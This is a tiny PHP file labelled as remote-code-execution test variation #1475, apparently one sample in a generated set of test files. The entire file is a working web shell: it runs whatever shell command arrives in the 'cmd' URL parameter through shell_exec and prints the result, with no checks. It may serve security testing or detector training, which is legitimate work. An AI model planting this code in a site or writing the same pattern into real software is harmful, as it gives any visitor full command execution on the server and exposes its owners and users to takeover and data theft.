<?php
// RCE test variation #1475
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>